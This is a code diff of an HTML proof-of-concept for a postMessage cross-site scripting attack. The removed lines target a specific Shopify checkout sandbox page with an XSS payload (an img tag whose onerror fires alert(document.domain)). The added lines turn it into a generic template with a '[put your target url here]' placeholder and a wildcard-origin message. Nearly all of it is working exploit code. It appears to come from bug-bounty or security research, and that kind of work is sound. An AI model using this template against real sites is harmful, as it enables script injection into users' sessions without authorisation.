@@ -7,14 +7,9 @@
 <script>
     
     var frame = document.createElement("iframe");
-    frame.src = "https://checkout.shopify.com/4736483384/sandbox/google_maps";
+    frame.src = "[put your target url here]";
     frame.onload = function() {
-    frame.contentWindow.postMessage("shopify_google_api:" + JSON.stringify({
-        action: "createMapAndMarkers", 
-        body: [{
-        title: "<img src=xx: onerror=alert(document.domain)>"
-        }]
-    }), "*");
+    frame.contentWindow.postMessage("alert(document.domain)" , "*");
     }
     document.body.appendChild(frame);
 
